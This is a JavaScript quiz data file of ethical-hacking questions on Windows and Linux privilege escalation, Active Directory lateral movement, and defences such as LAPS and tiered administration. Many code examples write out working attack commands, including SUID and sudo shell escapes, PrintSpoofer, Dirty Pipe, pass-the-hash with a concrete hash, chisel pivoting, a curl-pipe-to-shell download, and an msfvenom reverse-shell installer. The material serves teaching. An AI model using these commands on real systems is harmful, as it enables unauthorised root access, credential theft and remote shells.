const questions = [
  {
    question: "What is the technical distinction between 'Vertical Privilege Escalation' and 'Horizontal Privilege Escalation'?",
    shortAnswer: "Vertical escalation elevates access from a low-privilege user to a higher-privilege account (e.g., standard user to Root / SYSTEM); Horizontal escalation accesses data/functions of another user at the same privilege level.",
    explanation: "In Vertical Privilege Escalation, an attacker who compromised a web service account (`www-data` or standard employee) exploits kernel bugs, SUID binaries, or token privileges to jump to Superuser (`root` on Linux or `NT AUTHORITY\\SYSTEM` on Windows). In Horizontal Privilege Escalation, user Mamata exploits an IDOR or insecure session to view the financial banking dashboard belonging to another user, Debangshu, without gaining administrative rights.",
    hint: "Think about climbing up the ladder to the boss's office (Vertical) versus walking into your coworker's cubicle next door (Horizontal).",
    level: "basic",
    codeExample: `// Escalation Comparison:
Vertical:   www-data (Low-Priv)  ──[ Linux SUID Exploit ]──> root (Superuser UID 0)
Horizontal: User Mamata (ID: 104) ──[ IDOR API Exploit ]────> User Debangshu (ID: 105 Data)`
  },
  {
    question: "What is 'Token Impersonation' (e.g. `SeImpersonatePrivilege`), and how do Potato exploits (PrintSpoofer / GodPotato) escalate service accounts to `NT AUTHORITY\\SYSTEM`?",
    shortAnswer: "Service accounts holding `SeImpersonatePrivilege` can impersonate any connecting security token; Potato exploits trick a SYSTEM-level service into connecting to a named pipe controlled by the attacker, capturing and impersonating the SYSTEM token.",
    explanation: "Windows service accounts (like `IIS_IUSRS` or `LOCAL SERVICE`) often hold the `SeImpersonatePrivilege` user right. Tools like `PrintSpoofer.exe` or `GodPotato.exe` trigger the Windows Print Spooler or DCOM RPC service to connect to a named pipe created by the attacker. When the SYSTEM-level service connects, the exploit intercepts the SYSTEM authentication token and calls `DuplicateTokenEx()` and `CreateProcessWithTokenW()`, spawning an instant `NT AUTHORITY\\SYSTEM` command prompt.",
    hint: "Think about having the legal right to wear anyone's security badge who visits your desk, and tricking the CEO into visiting your desk.",
    level: "expert",
    codeExample: `// PrintSpoofer Privilege Escalation Command:
whoami /priv # Check for SeImpersonatePrivilege
PrintSpoofer.exe -i -c cmd.exe
// Output:
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe created: \\\\.\\pipe\\PrintSpoofer\\pipe\\spoolss
[+] Spawning process with SYSTEM token...
whoami -> nt authority\\system!`
  },
  {
    question: "What is an 'Unquoted Service Path' vulnerability on Windows, and how does the operating system's space-handling behavior allow privilege escalation?",
    shortAnswer: "When a Windows service binary path contains spaces and lacks quotation marks (e.g., `C:\\Program Files\\My Service\\app.exe`); Windows attempts to execute `C:\\Program.exe` first, allowing attackers to place a malicious binary in that path.",
    explanation: "When Windows starts a service configured as `C:\\Program Files\\Vuln Service\\service.exe` without quotes, the OS interpreter splits the path at every space. It looks for executables in this exact order: 1. `C:\\Program.exe`; 2. `C:\\Program Files\\Vuln.exe`; 3. `C:\\Program Files\\Vuln Service\\service.exe`. If a standard user has write permissions to `C:\\` and places a malicious `Program.exe` there, Windows executes it with SYSTEM rights when the service restarts.",
    hint: "Think of a courier reading an address with missing commas and dropping the package off at the first partial street name they find.",
    level: "moderate",
    codeExample: `// Vulnerable Service Path in Registry:
ImagePath = C:\\Program Files\\Development Tools\\agent.exe (Unquoted!)
Attacker Action: Drop malicious payload at C:\\Program Files\\Development.exe
Result: On service restart, Windows executes Development.exe with SYSTEM privileges!`
  },
  {
    question: "How do ethical hackers exploit 'Linux SUID Binaries' (using GTFOBins) for instant local root privilege escalation?",
    shortAnswer: "SUID binaries execute with the permissions of the file owner (Root); if a binary with built-in shell escape or file-read functions (like `/usr/bin/find` or `/usr/bin/python`) has the SUID bit set, executing it spawns a root shell.",
    explanation: "When the SUID permission bit is set (`chmod u+s`), the binary executes with the privileges of its owner (UID 0 / root). If an administrator accidentally sets SUID on standard utilities (`find`, `vim`, `bash`, `nmap`), an attacker runs `find . -exec /bin/sh -p \\; -quit`. The `-p` flag preserves the effective root UID, dropping the attacker into an immediate root shell (`#`). GTFOBins curates hundreds of such binary bypasses.",
    hint: "Think of an employee borrowing the CEO's official signature stamp to approve their own promotion.",
    level: "basic",
    codeExample: `// Linux SUID Discovery & Exploitation:
find / -perm -4000 2>/dev/null # Discovers /usr/bin/find with SUID bit
/usr/bin/find . -exec /bin/sh -p \\; -quit
# id
uid=1000(mamata) gid=1000(mamata) euid=0(root) -> ROOT SHELL!`
  },
  {
    question: "What is 'Sudo Misconfiguration' (`sudo -l` with `NOPASSWD:`), and how does an attacker leverage it to execute root commands?",
    shortAnswer: "When `/etc/sudoers` grants a user permission to run specific binaries as root without requiring a password; if those binaries support shell escapes (e.g., `vim`, `less`, `awk`), the attacker escapes to a root shell.",
    explanation: "Running `sudo -l` lists the current user's permitted sudo privileges. If `/etc/sudoers` contains `mamata ALL=(ALL) NOPASSWD: /usr/bin/vim`, the user runs `sudo vim`. Inside the Vim editor, the user types `:!/bin/bash` and presses Enter. Because Vim is executing under root context, the spawned subshell inherits full root privileges.",
    hint: "Think of being permitted to drive the company truck without a key, and driving it straight through the security gates.",
    level: "basic",
    codeExample: `// Sudo NOPASSWD Shell Escape via Vim:
sudo -l
# User mamata may run the following commands: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'`
  },
  {
    question: "What is 'Dirty Pipe' (CVE-2022-0847), and how did this Linux kernel vulnerability allow unprivileged users to overwrite read-only files like `/etc/passwd`?",
    shortAnswer: "A flaw in the Linux kernel pipe buffer implementation where uninitialized flags allowed unprivileged users to write data into page cache pages belonging to read-only files.",
    explanation: "Dirty Pipe exploited a bug in the Linux kernel (5.8 to 5.16.11). By manipulating pipe buffer ring structures (`pipe_buffer.flags = PIPE_BUF_FLAG_CAN_MERGE`), an unprivileged local user could splice data into the kernel's cached page of `/etc/passwd` or `/etc/shadow`. The attacker overwrote the root password hash in memory, allowing them to switch to root (`su root`) with a known password without modifying the physical disk file directly.",
    hint: "Remember the 2022 Linux kernel bug that allowed writing directly into read-only system files.",
    level: "expert",
    codeExample: `// Dirty Pipe Exploitation:
./dirtypipe /etc/passwd 1 "root:0:0:" "root:$6$hacked...:0:0:"
su root # Logs in as root with the newly injected password hash!`
  },
  {
    question: "What is 'BloodHound', and how do Active Directory penetration testers use Graph Theory to identify hidden lateral movement paths to Domain Admins?",
    shortAnswer: "A data visualization tool that maps Active Directory trust relationships, user group memberships, and local administrator rights as a graph database (Neo4j) to find the shortest attack path to Domain Admin.",
    explanation: "Active Directory permissions are massive and complex. BloodHound uses a data collector (`SharpHound.exe`) to ingest all AD users, computers, sessions, and ACLs into a Neo4j graph database. Running graph algorithms (like Dijkstra's shortest path), BloodHound reveals complex multi-hop pivot chains: User A is in Group B, which has GenericAll rights over Computer C, where Domain Admin D has an active logged-in session, allowing the tester to reach Domain Admin in 3 steps.",
    hint: "Think of Google Maps for Active Directory that finds the fastest driving route from a regular employee laptop to the Domain Controller.",
    level: "moderate",
    codeExample: `// BloodHound Ingestion & Query:
SharpHound.exe -c All
// Neo4j Cypher Query: "Find Shortest Paths to Domain Admins"
MATCH p=shortestPath((u:User {name:'MAMATA@FINTECH.CO.IN'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@FINTECH.CO.IN'})) RETURN p`
  },
  {
    question: "What is 'Pass-the-Hash' (PtH), and how does an attacker use tools like `psexec` or `wmiexec` to move laterally across an internal network?",
    shortAnswer: "Authenticating to remote Windows systems over SMB (TCP 445) or WMI (TCP 135) using an extracted NTLM hash directly, without needing to crack or provide the cleartext password.",
    explanation: "When an attacker dumps the Local Security Authority Subsystem Service (LSASS) memory on a compromised workstation, they obtain the NTLM hash of a local administrator (e.g. `Administrator:8846f7eaee8fb117ad06bdd830b7586c`). If the organization configured the identical local administrator password across all workstations, the attacker runs `wmiexec.py -hashes :8846f7... Administrator@192.168.1.51`, executing commands on every computer across the subnet.",
    hint: "Think of using a master passkey to unlock every office in the building after finding it in one desk drawer.",
    level: "moderate",
    codeExample: `// Lateral Movement via Impacket wmiexec:
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c Administrator@192.168.1.100
// Output: Spawns interactive semi-interactive command shell on target host!`
  },
  {
    question: "What is 'LAPS' (Local Administrator Password Solution), and how does it neutralize enterprise-wide Pass-the-Hash lateral movement?",
    shortAnswer: "Microsoft LAPS automatically generates a unique, complex, randomly generated password for the local Administrator account on every computer and stores it securely in Active Directory.",
    explanation: "Without LAPS, IT administrators use the same default master password for the local `Administrator` account on thousands of employee laptops. If an attacker compromises one laptop and dumps the NTLM hash, they can Pass-the-Hash to every other computer in the enterprise. LAPS randomizes the local administrator password on every computer individually and rotates it every 30 days, confining any breach to a single endpoint.",
    hint: "Think of giving every single hotel room a completely different random lock combination rather than using one master key for all rooms.",
    level: "basic",
    codeExample: `// Active Directory LAPS Architecture:
Workstation 1: Administrator Password = "f8#K!9xZ2$pQ" (Rotated every 30 days)
Workstation 2: Administrator Password = "m2@L*7vR9#wX" (Unique!)
-> Pass-the-Hash from Workstation 1 to Workstation 2 FAILS completely!`
  },
  {
    question: "What is 'SSH Pivoting' and 'SOCKS Proxy Tunneling' (e.g. `chisel` / `ssh -D`), and how do ethical hackers route traffic into internal, non-routable subnets?",
    shortAnswer: "Creating an encrypted TCP tunnel through a dual-homed compromised host that acts as a SOCKS proxy, allowing the attacker's tools to reach private internal IP subnets.",
    explanation: "An attacker compromises a DMZ web server with two network interfaces: public IP `203.0.113.50` and private IP `10.0.0.5`. The attacker's laptop cannot route packets directly to internal `10.0.0.0/24` databases. By running `ssh -D 1080 user@203.0.113.50` or using `chisel`, a dynamic SOCKS5 proxy is created on port 1080. The attacker configures `proxychains nmap -sT 10.0.0.100`, tunneling their scan packets through the web server into the internal network.",
    hint: "Think of having a friend inside a private club hold the door open and relay your messages to people in the back room.",
    level: "expert",
    codeExample: `// Chisel SOCKS5 Pivoting:
Attacker Server:  chisel server -p 8000 --reverse
Victim DMZ Host:  chisel client 203.0.113.10:8000 R:1080:socks
Attacker Pivot:   proxychains nmap -sT -p 445 10.0.0.0/24 (Scans internal private network!)`
  },
  {
    question: "What is 'WinPEAS' and 'LinPEAS', and why are automated privilege escalation enumeration scripts essential in ethical penetration testing?",
    shortAnswer: "Automated search scripts that audit hundreds of local privilege escalation misconfigurations (weak service permissions, unquoted paths, SUID files, credentials in registry, kernel CVEs) in minutes.",
    explanation: "Manually checking every registry key, file permission, and cron job on a system takes hours. PEAS (Privilege Escalation Awesome Scripts Suite) automates this: `linpeas.sh` on Linux and `winPEASx64.exe` on Windows execute hundreds of checks in under 60 seconds, outputting color-coded results (RED/YELLOW highlights highly exploitable 99% privilege escalation vectors) to guide the auditor immediately.",
    hint: "Remember the world's most famous color-coded privilege escalation scripts for Windows and Linux.",
    level: "basic",
    codeExample: `// Running LinPEAS on Compromised Host:
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
// Red/Yellow Output Flags:
[!] SUID binary: /usr/bin/find (99% PE Vector!)
[!] Writable file: /etc/passwd`
  },
  {
    question: "What is 'Overpass-the-Hash' (Pass-the-Key), and how does it convert an NTLM hash into a valid Kerberos Ticket-Granting Ticket (TGT)?",
    shortAnswer: "Using an NTLM hash to perform a Kerberos pre-authentication request (AS-REQ) to the Domain Controller, receiving a valid Kerberos TGT to move laterally using Kerberos rather than NTLM.",
    explanation: "When organizations disable legacy NTLM authentication, standard Pass-the-Hash fails. In Overpass-the-Hash, the attacker uses tools like Rubeus or Mimikatz (`sekurlsa::pth /user:admin /domain:fintech.co.in /ntlm:[hash] /ptt`). The tool uses the NTLM hash as the encryption key for the Kerberos AS-REQ pre-authentication timestamp. The Domain Controller accepts the request and returns a valid Kerberos TGT into the user's memory session, allowing lateral movement over modern Kerberos.",
    hint: "Think of converting an old physical token into a modern digital barcode pass at the gate.",
    level: "expert",
    codeExample: `// Overpass-the-Hash via Rubeus:
Rubeus.exe asktgt /user:Administrator /domain:FINTECH.CO.IN /rc4:8846f7eaee8fb117ad06bdd830b7586c /ptt
// Output: Successfully requested and imported Kerberos TGT into current logon session!`
  },
  {
    question: "What is 'AlwaysInstallElevated' in the Windows Registry, and how does it allow standard users to execute arbitrary `.msi` installers with SYSTEM privileges?",
    shortAnswer: "A registry policy setting that, if enabled under both HKCU and HKLM, forces Windows Installer (`msiexec`) to run all `.msi` installation packages with elevated `NT AUTHORITY\\SYSTEM` rights.",
    explanation: "If administrators enable `AlwaysInstallElevated = 1` in both `HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer` and `HKCU\\Software\\Policies\\...`, any user can execute an installation package with full SYSTEM privileges. An ethical hacker generates a malicious installer using `msfvenom -p windows/shell_reverse_tcp LHOST=... -f msi -o update.msi` and runs `msiexec /quiet /qn /i update.msi`, instantly receiving a SYSTEM reverse shell.",
    hint: "Think of an administrative rule that says any installation package must be trusted as if the CEO approved it.",
    level: "moderate",
    codeExample: `// AlwaysInstallElevated Exploitation:
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated # Value: 0x1
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated # Value: 0x1
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi`
  },
  {
    question: "What is the 'Tiered Administration Model' (Tier 0, Tier 1, Tier 2), and how does it stop lateral movement across enterprise Active Directory networks?",
    shortAnswer: "Separating administrative credentials into 3 isolated security tiers: Tier 0 (Domain Controllers/Identity), Tier 1 (Enterprise Servers/Databases), Tier 2 (Workstations/Laptops); Tier 0 accounts are strictly forbidden from logging into Tier 2 workstations.",
    explanation: "In an unsegmented network, Domain Admins log into standard laptops to fix printer issues, leaving their credentials in the laptop's LSASS memory. If an attacker compromises the laptop, they dump LSASS and capture Domain Admin rights. The Tiered Model enforces strict isolation: Tier 0 credentials can ONLY log into Domain Controllers. Even if every Tier 2 workstation is compromised, the attacker cannot steal Tier 0 credentials because they are never present in workstation RAM.",
    hint: "Think of having a special gold master key that is only allowed inside the main vault building and can never be taken outside.",
    level: "moderate",
    codeExample: `// Enterprise Tiered Administration Architecture:
Tier 0 (Identity):   Domain Controllers, PKI, Azure AD Connect (Strictly Isolated!)
Tier 1 (Apps):       SQL Servers, Web Clusters, ERP Applications
Tier 2 (Endpoints):  User Laptops, Desktops, Workstations
Rule: Tier 0 Admins NEVER log into Tier 1 or Tier 2 machines!`
  },
  {
    question: "What is 'Evil-WinRM', and how do ethical hackers use it to establish remote command shells over Windows Remote Management (Port 5985/5986)?",
    shortAnswer: "The premier penetration testing tool for Windows Remote Management (WinRM); allows remote PowerShell command execution, script loading in memory, and Pass-the-Hash logins over HTTP/HTTPS ports 5985/5986.",
    explanation: "WinRM is Microsoft's implementation of WS-Management, enabled by default on Windows Server. Evil-WinRM allows testers with valid credentials (or NTLM hashes) to connect remotely: `evil-winrm -i 192.168.1.50 -u admin -H 8846f7...`. It provides an interactive PowerShell shell, allows uploading/downloading files, running in-memory PowerShell scripts (`Bypass-404`), and loading C# assemblies directly into RAM.",
    hint: "Think of an enhanced remote PowerShell terminal designed specifically for ethical penetration testers.",
    level: "basic",
    codeExample: `// Evil-WinRM Pass-the-Hash Execution:
evil-winrm -i 192.168.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
// Spawns interactive remote PowerShell prompt with full admin privileges!`
  },
  {
    question: "What is a 'Kernel Exploit', and why do professional ethical hackers treat kernel exploits as a last resort during penetration tests?",
    shortAnswer: "An exploit targeting a flaw in the core operating system kernel (e.g. Dirty COW); it is a last resort because kernel crashes trigger Blue Screens of Death (BSOD) or kernel panics, causing production server downtime.",
    explanation: "Kernel exploits execute code in Ring 0. If a userland exploit fails, the single process crashes and restarts. If a kernel exploit fails (due to minor memory address shifts or kernel version mismatches), the entire operating system crashes instantly with a BSOD on Windows or a Kernel Panic on Linux, taking production databases and services offline. Ethical testers exhaust misconfigurations (SUID, sudo, unquoted paths) before attempting kernel exploits.",
    hint: "Think about performing surgery directly on the heart: if your hand slips, the patient dies immediately.",
    level: "moderate",
    codeExample: `// Kernel Exploit Risk Spectrum:
Userland Misconfiguration (SUID / Sudo / Path): 100% Safe, Zero Downtime Risk (Preferred!)
Kernel Exploit (Dirty COW / Baron Samedit):     HIGH RISK: May cause instant Kernel Panic / BSOD!`
  },
  {
    question: "What is 'Micro-segmentation' and 'Zero Trust Network Access' (ZTNA), and how does it prevent lateral movement between workstations on the same local subnet?",
    shortAnswer: "Enforcing software-defined firewall policies on individual endpoints so workstations cannot communicate with each other directly, even if they are plugged into the same local network switch.",
    explanation: "In traditional flat networks, if an attacker compromises Laptop A (`192.168.1.50`), they can scan and attack Laptop B (`192.168.1.51`) directly over SMB/RPC. Micro-segmentation (using host firewalls or tools like Illumio/Zscaler) enforces a strict default-deny rule on all lateral peer-to-peer traffic: Workstation-to-Workstation traffic is blocked 100%. Endpoints can only communicate with authorized enterprise servers, stopping lateral movement at the edge.",
    hint: "Think of soundproof, locked hotel rooms where guests cannot open the doors between neighboring rooms.",
    level: "moderate",
    codeExample: `// Micro-segmentation Host Firewall Rule (Windows Defender Firewall):
Block Inbound TCP Ports 135, 139, 445, 5985 from Subnet: 192.168.1.0/24
// Result: Lateral SMB and WinRM pivots between employee laptops are completely blocked!`
  },
  {
    question: "What is 'Baron Samedit' (CVE-2021-3156), and how did a heap-based buffer overflow in `sudo` grant local root privileges across almost all Linux distributions?",
    shortAnswer: "A flaw in sudo's command-line argument parsing when escaping characters (`sudoedit -s`); unprivileged users triggered a heap overflow that corrupted sudo's internal data structures, granting instant root shell access.",
    explanation: "Disclosed in 2021 by Qualys, Baron Samedit affected nearly all Linux distributions running `sudo` since 2011. When executing `sudoedit -s` with a trailing backslash, sudo improperly unescaped the command-line arguments, writing past the heap-allocated memory buffer. By overwriting internal service user structures in heap memory, an unprivileged attacker could execute arbitrary code as root without knowing any password.",
    hint: "Remember the famous 2021 Linux sudo bug that granted instant root access on almost every Linux system.",
    level: "expert",
    codeExample: `// Baron Samedit (CVE-2021-3156) Proof-of-Concept:
./sudo-hax-me-a-sandwich
// Output:
[+] Exploit succeeded! Spawning root shell...
# whoami
root`
  },
  {
    question: "Under the Indian Information Technology Act 2000, what are the legal ramifications of executing unauthorized privilege escalation and lateral movement?",
    shortAnswer: "Constitutes multiple cognizable offenses under Section 66 (Hacking), Section 66C (Identity Theft), and Section 70 (Accessing Protected Systems - up to 10 years imprisonment).",
    explanation: "Executing privilege escalation without authorization elevates simple trespass to aggravated hacking under Section 66. Extracting credentials for lateral movement violates Section 66C (Identity Theft). Furthermore, if the lateral movement pivots into designated critical national infrastructure systems (such as power grids, banking switches, or telecom backbones declared as 'Protected Systems' under Section 70), the offense carries up to 10 years rigorous imprisonment.",
    hint: "Remember the severe 10-year prison sentence under Section 70 for hacking protected critical infrastructure.",
    level: "basic",
    codeExample: `// Indian IT Act 2000 Prosecution for Lateral Pivoting:
Privilege Escalation on Server    -> Section 66 (Up to 3 Years Prison + Fine)
Lateral Pivot to Core Bank Switch -> Section 70 Protected System (Up to 10 YEARS RIGOROUS IMPRISONMENT!)`
  },
  {
    question: "Synthesizing Privilege Escalation and Lateral Movement: what is the ultimate strategic lesson for enterprise cybersecurity defense?",
    shortAnswer: "Assume breach at the perimeter; build resilient internal defenses with Least Privilege, LAPS, Tiered Administration, and Micro-segmentation so that compromising one workstation does not lead to domain-wide catastrophe.",
    explanation: "Perimeter defenses will eventually fail. The mark of mature cybersecurity engineering is containment: ensuring that when an attacker lands on an unprivileged marketing laptop, they encounter insurmountable internal friction. By eliminating SUID flaws, randomizing local admin passwords with LAPS, isolating Domain Admins into Tier 0, and blocking lateral workstation-to-workstation traffic, defenders turn a potential disaster into a localized, easily remediated incident.",
    hint: "Conclude by recognizing that robust privilege management and lateral friction are what turn an initial compromise into a harmless, contained event.",
    level: "expert",
    codeExample: `// The Zero Trust Strategic Equation:
(Least_Privilege + LAPS_Rotation + Tiered_Architecture + Microsegmentation) = IMMUNITY_TO_LATERAL_COLLAPSE;`
  }
];

export default questions;
